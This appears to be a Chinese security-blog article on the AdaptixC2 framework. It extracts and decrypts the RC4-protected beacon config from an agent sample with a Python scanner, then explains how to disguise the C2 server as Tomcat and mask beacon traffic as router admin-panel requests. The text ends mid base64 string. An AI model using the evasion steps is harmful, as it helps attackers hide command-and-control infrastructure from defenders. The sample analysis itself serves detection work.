# AdaptixC2样本分析及流量特征魔改-先知社区

> **来源**: https://xz.aliyun.com/news/18820  
> **文章ID**: 18820

---

# AdaptixC2样本分析之 agent\_beacon解密

## 1. 前言

之前分析过listener\_beacon\_http流量，里面需要用到一个EncryptKey进行RC4 加密流量，所以本章主要介绍的是实战情况下，手上只有一个样本的情况下，如何去分析出加解密用的key以及样本所使用的profile

**环境**

* AdaptixC2 Server端与Agent端（源码自备）
* IDE
* 16进制编辑器

## 2. 开始

默认生成的agent名是agent.x64.exe，所以我们CTRL+F大法搜索agent.x64，大致定位下生成的逻辑

![image.png](images/img_18820_000.png)

filename：AdaptixC2\_main\_v0.8\Extenders\agent\_beacon\pl\_agent.go

![image.png](images/img_18820_001.png)

![image.png](images/img_18820_002.png)

发现pl\_agent.go并没有直接生成二进制，而是调用了 **MinGW-w64 / MinGW32 交叉编译工具链** 来编译 C/C++ 源码生成可执行文件

```
if generateConfig.Arch == "x86" {
    Compiler = "i686-w64-mingw32-g++"
    Ext = ".x86.o"
    stubPath = currentDir + "/" + ObjectDir + "/stub.x86.bin"
    Filename = "agent.x86"
} else {
    Compiler = "x86_64-w64-mingw32-g++"
    Ext = ".x64.o"
    stubPath = currentDir + "/" + ObjectDir + "/stub.x64.bin"
    Filename = "agent.x64"
}
...............................
agentProfileSize := len(agentProfile) / 4
if generateConfig.Format == "Service Exe" {
    cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DBUILD_SVC -DSERVICE_NAME='"%s"' -DPROFILE='"%s"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, cFlags, ObjectDir, svcName, string(agentProfile), agentProfileSize, tempDir)
} else {
    cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='"%s"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, cFlags, ObjectDir, string(agentProfile), agentProfileSize, tempDir)
}
runnerCmdConfig := exec.Command("sh", "-c", cmdConfig)
runnerCmdConfig.Dir = currentDir
runnerCmdConfig.Stdout = &stdout
runnerCmdConfig.Stderr = &stderr
err = runnerCmdConfig.Run()
```

往上翻翻在AgentGenerateProfile函数翻到了对encrypt\_key的定义，从 listenerMap 中传入的，然后通过 Base64 解码得到二进制 key

![image.png](images/img_18820_003.png)

```
encrypt_key, _ := listenerMap["encrypt_key"].(string)
encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
```

定义了HTTP Profile 结构体,用于确定 Agent 配置参数，HTTP 协议的 C2 地址、端口、URI、User-Agent、HTTP 头等，说明**params**不包含 key，只是被加密的业务配置

```
case "http":

		var Hosts []string
		var Ports []int
		hosts_agent, _ := listenerMap["callback_addresses"].(string)
		lines := strings.Split(strings.TrimSpace(hosts_agent), ", ")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}

			host, portStr, _ := net.SplitHostPort(line)
			port, _ := strconv.Atoi(portStr)

			Hosts = append(Hosts, host)
			Ports = append(Ports, port)
		}
		c2Count := len(Hosts)

		HttpMethod, _ := listenerMap["http_method"].(string)
		Ssl, _ := listenerMap["ssl"].(bool)
		Uri, _ := listenerMap["uri"].(string)
		ParameterName, _ := listenerMap["hb_header"].(string)
		UserAgent, _ := listenerMap["user_agent"].(string)
		RequestHeaders, _ := listenerMap["request_headers"].(string)

		WebPageOutput, _ := listenerMap["page-payload"].(string)
		ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
		ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])

		seconds, err := parseDurationToSeconds(generateConfig.Sleep)
		if err != nil {
			return nil, err
		}

		params = append(params, int(agentWatermark))
		params = append(params, Ssl)
		params = append(params, c2Count)
		for i := 0; i < c2Count; i++ {
			params = append(params, Hosts[i])
			params = append(params, Ports[i])
		}
		params = append(params, HttpMethod)
		params = append(params, Uri)
		params = append(params, ParameterName)
		params = append(params, UserAgent)
		params = append(params, RequestHeaders)
		params = append(params, ansOffset1)
		params = append(params, ansOffset2)
		params = append(params, kill_date)
		params = append(params, working_time)
		params = append(params, seconds)
		params = append(params, generateConfig.Jitter)
```

这里将 params 序列化为字节流 → packedParams ，用 RC4 key进行 加密 → cryptParams，说明RC4 key 在 profile 外层结构中

```
packedParams, err := PackArray(params)
cryptParams, err := RC4Crypt(packedParams, encryptKey)
...........................
profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
packedProfile, err := PackArray(profileArray)
```

结合之前看到的编译配置，大概率**profile**（含加密后的业务配置和 key）会被写入 **config.cpp** 并编译进二进制里面，所以把分析重点放在待编译目录

![image.png](images/img_18820_004.png)

用vs打开看看大概的目录结构 AdaptixC2\_main\_v0.8\Extenders\agent\_beacon\src\_beacon\beacon.sln

![image.png](images/img_18820_005.png)

可以看到config.cpp写了Profile，这里拿BEACON\_HTTP来分析下，跟一下getProfile的调用

![image.png](images/img_18820_006.png)

有三处调用，根据文件名的定义，先看第一个AgentConfig.cpp

![image.png](images/img_18820_007.png)

![image.png](images/img_18820_008.png)

先通过getProfile() 取到**Profile**，前 4 字节是一个 size（Unpack32()），表示配置区长度 profileSize

```
memcpy(ProfileBytes, getProfile(), size);
this->encrypt_key = (PBYTE) MemAllocLocal(16);
//在配置区的后面紧跟着存放着 16 字节的 key
memcpy(this->encrypt_key, packer->data() + 4 + profileSize, 16);
//用这个密钥对前面的配置区做了一次解密
DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);

//数据结构
[4字节长度 profile_size][profile_size字节加密配置][16字节RC4 key]
```

到这里就理清楚了，刚刚的config.cpp就存着**Profile**，把**Profile**拿出来分析看看

```
#if defined(BEACON_HTTP) 
char* getProfile()
{
	return (char*)"\xa9\x00\x00\x00\xa4\x65\xba\x4b\x98\x58\x78\x88\x53\xb8\x08\x4c\x93\xba\xae\x88\x9b\x7d\x37\x95\xaf\x65\xe9\x78\xf8\x77\x31\x49\xda\x00\xcd\x4d\xd4\x79\x1c\xa8\x2d\xb6\xa8\x87\x10\x51\x7d\x64\x1c\x24\xfd\x5c\xba\xad\xb5\x7f\xc0\x61\xd6\x66\xa5\xb5\x55\xce\x59\xf0\xda\x98\x58\x87\x0e\x27\x7c\x0c\x40\x14\x7b\x4e\xd5\xe5\xfb\x13\xf1\x17\x3c\xae\x9b\xf8\xec\xd7\x63\x04\x6c\x8e\x8b\x92\x49\x15\xce\x92\x05\x8a\x29\xa7\x9e\x0f\x8d\xe2\x26\xa1\xb8\xa2\xfc\x08\x6f\xf7\x0a\x63\x3c\x4c\xb9\x2f\x82\xe3\xe9\x62\x87\x13\x8b\x58\xac\x3f\x00\x26\x54\xc9\x59\x46\x8f\x30\x01\x7c\x48\xb7\x23\xe9\x06\xe9\x4d\x08\xaa\x4d\xd2\x5d\x71\x76\xe3\xeb\x23\x93\x34\x6a\x78\xaa\x81\x2a\xa5\xe7\x40\x6f\x48\x5f\x4e\x6e\x0b\x08\xa4\x27\x8b\x2a\x91\x9f\x3e\x2d\x94\x66\x76\x5e\xd1";
}
```

数据结构：

```
[0~3]      : profile_size（小端 4 字节）
[4~4+size-1]: 加密配置区（profile_size 字节）
[4+size~4+size+15]: RC4 key（16 字节）
```

* **关键点**：key 在加密配置区后面紧跟的16 字节**profile\_size** 是一个小端整数（4 字节），标记加密配置长度
* **RC4 key** 被嵌入在静态数组的最后，用于解密前面的加密配置。

这里验证下猜想，简单构建下脚本，打印看看，这里little是小端 x64架构

```
# 原始数据
hex_bytes = (
    b"\xa9\x00\x00\x00\xa4\x65\xba\x4b\x98\x58\x78\x88\x53\xb8\x08\x4c\x93"
    b"\xba\xae\x88\x9b\x7d\x37\x95\xaf\x65\xe9\x78\xf8\x77\x31\x49\xda\x00"
    b"\xcd\x4d\xd4\x79\x1c\xa8\x2d\xb6\xa8\x87\x10\x51\x7d\x64\x1c\x24\xfd"
    b"\x5c\xba\xad\xb5\x7f\xc0\x61\xd6\x66\xa5\xb5\x55\xce\x59\xf0\xda\x98"
    b"\x58\x87\x0e\x27\x7c\x0c\x40\x14\x7b\x4e\xd5\xe5\xfb\x13\xf1\x17\x3c"
    b"\xae\x9b\xf8\xec\xd7\x63\x04\x6c\x8e\x8b\x92\x49\x15\xce\x92\x05\x8a"
    b"\x29\xa7\x9e\x0f\x8d\xe2\x26\xa1\xb8\xa2\xfc\x08\x6f\xf7\x0a\x63\x3c"
    b"\x4c\xb9\x2f\x82\xe3\xe9\x62\x87\x13\x8b\x58\xac\x3f\x00\x26\x54\xc9"
    b"\x59\x46\x8f\x30\x01\x7c\x48\xb7\x23\xe9\x06\xe9\x4d\x08\xaa\x4d\xd2"
    b"\x5d\x71\x76\xe3\xeb\x23\x93\x34\x6a\x78\xaa\x81\x2a\xa5\xe7\x40\x6f"
    b"\x48\x5f\x4e\x6e\x0b\x08\xa4\x27\x8b\x2a\x91\x9f\x3e\x2d\x94\x66\x76"
    b"\x5e\xd1"
)

# 前 4 字节表示 profileSize
profile_size = int.from_bytes(hex_bytes[:4], "little")

# 取出 encrypt_key （profile_size 后的 16 字节）
encrypt_key = hex_bytes[4 + profile_size : 4 + profile_size + 16]

print(profile_size, encrypt_key.hex())
```

这里169表示4 字节（a9 00 00 00）加密配置区长度，那第 173~188 字节就是 **encrypt\_key**

```
//out：169 6e0b08a4278b2a919f3e2d9466765ed1
```

下面看看能不能用key解密配置区

```
from Crypto.Cipher import ARC4
# 提取加密的配置区
encrypted_profile = hex_bytes[4:4 + profile_size]
# print(encrypted_profile)

# 用提取出的 RC4 key 解密
cipher = ARC4.new(encrypt_key)
decrypted_profile = cipher.decrypt(encrypted_profile)

print(decrypted_profile)
```

```
//out：b'I\x01L\xbe\x01\x01\x00\x00\x00\r\x00\x00\x00172.16.196.1\x00[\x11\x00\x00\x05\x00\x00\x00POST\x00\t\x00\x00\x00/uri.php\x00\x0c\x00\x00\x00X-Beacon-Id\x00B\x00\x00\x00Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0\x00\x03\x00\x00\x00\r
\x00\x1a\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'

//对应AgentConfig中的字段
C2 地址：172.16.196.1
HTTP 方法：POST
URI：/uri.php
HTTP Header：X-Beacon-Id
User-Agent：Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/
```

到这里分析已经大概明朗了，现在就是怎么从样本中取到这个**Profile**了，既然能通过getProfile() 直接取到**Profile**，说明硬编码在二进制里面了，所以在无壳无魔改环境下应该能通过静动态分析出key从而拿到profile进行解密获得C2连接信息，这里构建一个脚本用于读取 exe 的二进制数据来扫描 profile 特征

```
import sys
import struct
import binascii
from Crypto.Cipher import ARC4
import textwrap
import base64
import re

def contains_ip(dec):
    # 正则匹配 IPv4 地址
    ip_pattern = rb'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    return re.search(ip_pattern, dec) is not None

# 从 exe 数据中扫描 profile
def try_parse_profile(blob, offset):
    if offset + 4 > len(blob): return None
    profile_size = struct.unpack_from("<I", blob, offset)[0]
    if profile_size < 20 or profile_size > 2048:
        return None
    enc_start = offset + 4
    enc_end = enc_start + profile_size
    key_start = enc_end
    key_end = key_start + 16
    if key_end > len(blob): return None

    enc_profile = blob[enc_start:enc_end]
    enc_key = blob[key_start:key_end]
    cipher = ARC4.new(enc_key)
    dec = cipher.decrypt(enc_profile)

    if contains_ip(dec):
        return profile_size, enc_key, dec
    return None
    # 简单检测是否可能是 HTTP beacon
    # if b"POST" in dec:
    #     return profile_size, enc_key, dec
    # return None


def main(exe_path):
    with open(exe_path, "rb") as f:
        blob = f.read()

    found = False
    for i in range(len(blob) - 20):
        result = try_parse_profile(blob, i)
        if result:
            profile_size, enc_key, dec = result
            print("="*60)
            print(f"[+] Found profile at offset 0x{i:X}")
            print(f"    RC4 key file offset = 0x{(i + 4 + profile_size):X}")  # key 在文件中的偏移
            print(f"    profile_size = {profile_size}")
            print(f"    RC4 key = {binascii.hexlify(enc_key).decode()}")
            #转为 Base64
            print(f"    RC4 key (Base64) = {base64.b64encode(enc_key).decode()}")
    
            print("
[+] Decrypted profile (printable preview):")
            preview = ''.join((chr(b) if 32 <= b < 127 else '.') for b in dec[:256])
            print(textwrap.fill(preview, width=80))
            print("="*60)
            found = True
            break

    if not found:
        print("[-] No valid profile found. Try adjusting search logic.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <exe_path>")
        sys.exit(1)
    main(sys.argv[1])
```

Run一下发现跟之前分析流量在服务端DB看到的key一致

```
python xxxx.py agent.x64.exe                                                                                                        
============================================================
[+] Found profile at offset 0x12400
    RC4 key file offset = 0x124DE
    profile_size = 218
    RC4 key = 909898f9e3686aafe3f15bd21d43a5d1
    RC4 key (Base64) = kJiY+eNoaq/j8VvSHUOl0Q==

[+] Decrypted profile (printable preview):
I.L..........C2回连地址（已码）.Q.......POST...../api/dns.....x-nws-log-
uuid.p...Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/139.0.0.0 Safari/537.36................................
============================================================
```

![image.png](images/img_18820_009.png)

同理拿这个0x124DE地址去16进制编辑器搜也能搜到这个key **909898f9e3686aafe3f15bd21d43a5d1**

![image.png](images/img_18820_010.png)

在key后面还发现一个静态特征Undefined symbol，只有一处地方，往前就能看到key了（后续试了下x86也有这个特征）

![image.png](images/img_18820_011.png)

# AdaptixC2魔改特征之 listener\_beacon\_http

## 1. 前言

之前分析过listener\_beacon\_http流量特征，所以这里就写写如何去特征的思路

## 2. 开始

**防资产测绘**

服务端跑起来后默认监听在4321端口，默认端点是/endpoint

![image.png](images/img_18820_012.png)

访问一下这个服务端，显然这个错误页太明显了

![image.png](images/img_18820_013.png)

还有响应头也是

![image.png](images/img_18820_014.png)

对服务端默认的**profile.json**改造下 （伪造下Tomcat）

* "port": 4321 > 大端口18080 常用端口容易招扫描
* "endpoint": "/endpoint" > tomcat的管理页 /manager/html
* "password": "pass" > 符合密码强度随意
* "Server": "AdaptixC2" > Apache-Coyote/1.1
* "Adaptix Version": "v0.8"> 删掉

![image.png](images/img_18820_015.png)

默认的**404page.html**改成tomcat的404页面

```
<!doctype html>
<html lang="zh">
  <head>
    <title>HTTP状态 404 - 未找到</title>
    <style type="text/css">
      body {
        font-family: Tahoma, Arial, sans-serif;
      }
      h1, h2, h3, b {
        color: white;
        background-color: #525D76;
      }
      h1 {
        font-size: 22px;
      }
      h2 {
        font-size: 16px;
      }
      h3 {
        font-size: 14px;
      }
      p {
        font-size: 12px;
      }
      a {
        color: black;
      }
      .line {
        height: 1px;
        background-color: #525D76;
        border: none;
      }
    </style>
  </head>
  <body>
    <h1>HTTP状态 404 - 未找到</h1>
    <hr class="line" />
    <p><b>类型</b> 状态报告</p>
    <p><b>消息</b> The requested resource [/manager/html] is not available</p>
    <p><b>描述</b> 源服务器未能找到目标资源的表示或者是不愿公开一个已经存在的资源表示。</p>
    <hr class="line" />
    <h3>Apache Tomcat/9.0.99</h3>
  </body>
</html>

```

改完效果如下

```
"Teamserver": {
  "interface": "0.0.0.0",
  "port": 18080 ,
  "endpoint": "/manager/html",
  "password": "pass1AsgHAsS2N",
  "cert": "server.rsa.crt",//有条件就上个正规证书和域名
  "key": "server.rsa.key",//有条件就上个正规证书和域名
  "extenders": [
    "extenders/listener_beacon_http/config.json",
    "extenders/listener_beacon_smb/config.json",
    "extenders/listener_beacon_tcp/config.json",
    "extenders/agent_beacon/config.json",
    "extenders/listener_gopher_tcp/config.json",
    "extenders/agent_gopher/config.json"
  ],
  "access_token_live_hours": 12,
  "refresh_token_live_hours": 168
}

"ServerResponse": {
  "status": 404,
  "headers": {
    "Content-Type": "text/html; charset=UTF-8",
    "Server": "Apache-Coyote/1.1"
  },
  "page": "404page.html"
}
```

![image.png](images/img_18820_016.png)

**去流量特征**

看下**Listener**有什么可配置的字段；基本思路是将http伪装成正常的业务流量

![image.png](images/img_18820_017.png)

![image.png](images/img_18820_018.png)

![image.png](images/img_18820_019.png)

由于心跳包的特性每几秒就会产生一个包，所以这里大概想法就是伪装成系统的后台带数据实时刷新的那种，比如说设备后台、大数据展示后台等等，思路可以自由拓展下，这里拿路由器后台举例

![image.png](images/img_18820_020.png)

通过模仿正常路由器的数据包来进行修改**Listener**

```
POST /stok=CjADI3WO2g%2B%2SYo%5D%7BK%08%08WG7H2YA5EIhY)/ds HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 160
Content-Type: application/json; charset=UTF-8
Host: 192.168.10.1
Origin: http://192.168.10.1
Referer: http://192.168.10.1/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest

{"wireless":{"name":["wlan_host_2g","wlan_host_5g"]},"guest_network":{"name":["guest_2g","guest_5g"]},"custom_wireless":{"name":["wifi_switch"]},"method":"get"}

HTTP/1.1 200 OK
Content-Type: text/html;charset=UTF-8
Content-Length: 1116
Connection: close
Access-Control-Allow-Origin: http://192.168.10.1
Cache-control: no-cache

{"code":200,"message":"OK","data":{"wireless":{"wlan_host_2g":{"enable":"1","ssid":"Test24G","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"9","bandwidth":"2","power":"0","isolate":"0","auth":"0","cipher":"1","max_sta_num":"0"},"wlan_host_5g":{"enable":"1","ssid":"Test5G","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"10","bandwidth":"0","power":"0","isolate":"0","auth":"0","cipher":"1","max_sta_num":"0"}},"custom_wireless":{"wifi_switch":{"enable":"on","enable_2g":"on","enable_5g":"on"}}}}
```

接下来开始配置**Main settings**，SSL我用的自签名证书，按需开启

![image.png](images/img_18820_021.png)

然后是**Page Payload** 记得找个字段插入<<<PAYLOAD\_DATA>>>

![image.png](images/img_18820_022.png)

```
{"wireless":{"wlan_host_2g":{"enable":"1","ssid":"CS24","ssidbr
  d":"1","encryption":"1","key":"88888888","channel":"0","mode":"9","bandwidth":"2","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"},"wlan_host_5g":{"enable":"1","ssid":"CS5","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"10","bandwidth":"0","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"}},"guest_network":{"guest_2g":{"ssid":"CMCC%2DGUEST%2D6kak","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"},"guest_5g":{"ssid":"CMCC%2DGUEST%2D6kak%2D5G","encrypt":"0","key":"<<<PAYLOAD_DATA>>>","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"}},"custom_wireless":{"wifi_switch":{"enable":"on","enable_2g":"on","enable_5g":"on","enable_5g1":"on","enable_5g4":"on"}},"error_code":0}
```

最后是Page Error 配置成路由器登录界面

![image.png](images/img_18820_023.png)

注意这个路由器登录页所用的样式图片都是base64内嵌在html中（实现单HTML文件访问），有条件可以考虑外链

```
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>WMA301</title>
    <meta name="MobileOptimized" content="240">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes">
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S/////////////40S//+NEv//jRL/////////////jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv////////////+NEv//jRL//40S//////////////////////////////ft//+zYf//jRL//40S//+NEv//jRL/////////////jRL//40S//+NEv////////////+NEv//jRL//6A5////////9er//40S//+NEv//jRL//40S/////////////40S//+NEv//jRL/////////////jRL//40S//+hPP////////Xr//+NEv//jRL//////////////////////////////////40S//////////////////////////////Tp//+2Z///jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL//40S//+NEv//jRL/AACcQQAAnEEAAJxBAACcQQAAnEEAAJxBAACcQQAAnEEAAJxBAACcQQAAnEEAAJxBAACcQQAAnEEAAJxBAACcQQ==" type="image/x-icon">
    <style>
      body,div,span,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,code,del,dfn,em,img,q,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,dialog,figure,footer,header,hgroup,nav,section {
        border: 0;
        font: inherit;
        margin: 0;
        padding: 0;
        outline: 0;
        vertical-align: baseline
      }
      input.subBtn {
        color: #333;
        font-size: 12px;
        border-radius: 3px;
        border: 0;
        cursor: pointer;
        vertical-align: middle;
        background: #fbeb1a
      }

      #Login {
        height: 100%;
        display: none
      }

      input[type="text"], input[type="password"] {
        outline: none;
        border: 1px solid #ccc; 
        box-shadow: none; 
      }
    </style>
  </head>
  <body>
    <div id="Error" style="top: -9999px; visibility: hidden; display: none;"></div>
    <div id="Confirm" style="top: -9999px; visibility: hidden; display: none;"></div>
    <div id="Con" style="display: none;"></div>
    <div id="Help" style="display: none;"></div>
    <div id="Cover" style="display: none; visibility: hidden;"></div>
    <div id="Login" style="display: block;">
    <div class="logo">
        <i class="tpLogo" id="tpLogo" style="display: none;"></i>
        <i class="andlinkLogo" id="andlinkLogo" style="background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAM0AAAAUCAYAAAFZiokYAAAAAXNSR0IArs4c6QAADHxJREFUeAHtmguUVlUVx5lBZIEa4wNkhbwRBMRAHpZAfKBgVAKmZgS5qHwNhs6SFYEBmSmLkDQXD5NABpaluMpQBEUFPgIlTW1Qk0QgHmWgZiOIJMhMv/+dsy/nu3PvfN8MYBGz1/rN3mfvffZ9nnvOvd/UqXMEpby8/PIqy5FQrgRppKuzU9KSCneYU0S7OAh4f/C1KysrU+pt0BRuV1gaCoNUjHBDXt9wA158I3aRKxD0sXz8F8BJLnYmdrGz62HPtLzD1hQ7vaoi+W6rKRLTzs44Ovxx8kpM0eYkvmR+7CcgHx6GJYEfI9yQl4j7kMh/qFXeDrup5brYWnw7zYe9Dq6APGjod6YdSjq0KoyVXgHtVPT6+Onh0Tqnbp4w3/n6W72oJv4eFMA+uMzi2LrBJoFurk7yo1+F12AUfBlet3wFJSmXmK5oHvpricqR19ouP0yMtgkEB4Q+oCS/X5xNyhQ3Srph94VvuZrXxuWbj7wJZv/PaXZudI12io5R6Rp1+IVdrMR8tHVrBGfdxfK82DDnK5YP+1mYBXdZTlQTW+6uzgfYBa7fYMvDp0dMQ9Ctdo6Lfxt7cpCDUQrhbSAbGeYSZZd6xdROOphfKIjYRsKDkdNq+Nr3Y691B/JV7BXCz5WNT0+Zq6AL9IH6oO1WnESMuIPBHcppVtR5Yg/Gbay9y5mOtoNZ6HzjrY5p+T37OppbYaA7qDauZhOnT/ZyC8gzfzBJBDGccQcTXBnrbJrcqeCLioY75OXJbQdTLL8cEssxX6Tdm5R/wmrzYz8K50AvuBT0qD4dhsB3YRDMCe9v61irK58BTtQavOdC07y8vI9pL8cegf1eNJuYcvw5URdllcurR+yH5KynvQsaQ124GzS3DgE9/AaSl/lcoVNwx6ElKZJCoZ0OvBV/wruQpjZmEq4IrCOBlAXR4XCzuDT+4G61POezpulTIn3k151cZAnoYte3seezoXUtvov8GmYr12xf474Z7of2bhh/A7sJDIfnYEwkfzC+YAGDnqQYWvN9XSiEhs73G+wN0B/WQ/CsQ/dxcdVfJzsUHDW5OP3oZ/I+RitrOF3ji6Mdo8bXI/WCZbvzRS+Onxo+h8MDTDDUKS6EW0vNV0CTwK3uAo3HbgbXgy7Qg35f2tGbSPsohgrLxW4A4eLN8+t4u0PmUw1HtS+OFU3S1GwLJnvj8ggWWIK0ckxbPm0dTFR00EWes9j1/ZXne9tqJGnlxsVwN4KOsMzVHeMuUAd8WtJ87Pejfb7LU78F0ALmwBqYAPe4uJZEM0Bzzq9Bb1OalNvATND+12xt5+/Q8WBzonSSdeM+6i7OL4+H4z5mjpELcwncCBkvxcfMAfy/7SgXorEbKUU6NtqdIXOi9g6a2CZrYl8Nt3m8ga3l827Ql49t8Jar+zy2+L7a+RhZxXWsKu8jggOVFxW/UzRm7WgO7RLnO4geZXmm8WmOCeck2RKLS9PUI8hE89QU+Kafk80mX3PBOyxnP0PuEF0gtFZUd+N/0e9Pe2GkfbNr34HuCXe6dlt0fWgOWj5fCRI9IoXec1rms9FQFDUJnRjmM20x2sEHOXQDeNriR1Cr/nx29Knq1CT/d+Rvgyfcvu7D1onUSclZqPMC/XXy/gy98/PzdS6mw2pYRHwiOpuUuYTrpam3FKULrBVkPfgtSBTX6DkR9sIhYUOhHPJWWGEAw48l+S0nW1x50RzaGjFa0fiy1asZO2JI1qrIJPi+Yn2qqymiFVhr0OtA8BKJ3usea49jnwUXR+viiz7K9C3G0KNMq9U3YRz8CdaoBnou7IGXoeMJ0cKH26aof+FaH0a9g7rbKfdvamjot8Teh0ujM0lKXeAx8v6SlJSj/wzydOd+nlob3QWpo1HDfujFujPELcnn4TdZhbHbNXRe9lBrM/2Vo5HRj3YQR1+DfzZa71C9XZ8KhSOUjACNMJBsaIhWEj+9UtA5ojm0NWLSlo+9yc/BvkxtxSP+H3jtA9h69NRI6DsS9C5iXwE+UCHaO8HsEX5x/EXQBGa53AF+3PlGOR3Od17+RdjNon0yDjIapEMo0VhV7bBThdElLtfPUZx2xoVxPn3WyBDnD32ufUroqDD6yV8TofsL8Ajok49Gii72Vsh3IyhldfH9RDb6JHgL9CieDQ/B+VDs4s9iq9ZiuA+Wgm68Z0Cfm7VaW2iTt/ocLdH3or+54vqAH5XFuWyYIX4FecOz5ZKnx4VGyssuN80GtZKqtlDmAjr1gG6gt329wfegnh6zPSFN20Q3jh5/94PmmTdAU4VWZ1+Am0Cic74D9KjVp5zHQOdnAyj/bLihxkOdzseNcMI1V2h11QZaQiMuyh70UZPaC3PUTu3xVZibV4uZCaB5vgE37gHsjdAY9E8QetpMxK8nT85CrUYk/4h+t0Q7EdO7YPeo32vr6Rk+LcnX00pPpL/CeYL4A+gqhX76+VavlsE6qnbQVHm6aoPZzgA3VHtynkS34aZ6FVu/Af4dCmEkaJnxe5gGl4L8A8jdhY4Vamlh+yXQwNPU2wK2gKQB3El/LZqvxm4H2gcNIF8m05hBXifyNFgkG2jrFXU59ma4D06GYuhD7F1i2l+9oZnoa5yOQ6LlwQ59MStNAHesfIg3rk+wICamtVCc7MUZ7adacVKGc2iwm1n+kJeKK4CvJEvXjDD5BQl1yi1RNZNy8M+HepYbp4kPA5NhyqFRZI6ILk6ooc+jpV7uLuyvWC52IdwE02SbP5smNzzObLmKk94T9L3iTZovccNpptF+6CVAN/u9sBJ6EbsRfRZonTpPPnKUl/TQ1pr1e/TTN5w+sF22a8+lrYHjiwaUanUC3fSy5QuEfmUYfaEV21TOErgYHofmxDvAu9iSMaD18hy4Dv4A80Ef5HR8nSFeKO5fGJqhpOJ7VHjJSoeZmUZwk0T7kqI3qzgpjebGtemYiuuM79MeNLYb+rbSNGFfazRoqKd+79gG0B+BBkfsTYf/QhgMekrnJOTmPGhIHQ16ex6s4ujPwS739q3/Suvv/BpYgd/F9JatTyRPgb5FzYKu0R3Epzf0LaCPi/qWtd/Zam8HffnVdvUAuR1UUzwNXwT9XHwG6KVSeX1B21b/5qBt7wDNiorfA8HyD90dVEcfN9e7+IvYXUB9V+R8UtX5KImmx0RhJwsIFiUk/DzBf7Tdq3kypdi3cWzop5GNdaP9D2Lvo4eStzYSz7V5HjW2k+wvO6bRnkTN/VUVIf58VfEjEBtAjedAN6xmGl2f/WxXs4FuzO+APjfVxa+fPfQ+MxaNq1xfc/S15BkYDh9ChpA32hzk6wG0Fl8H80V0ymtrVtAM8i8Ya376rpGfWtpX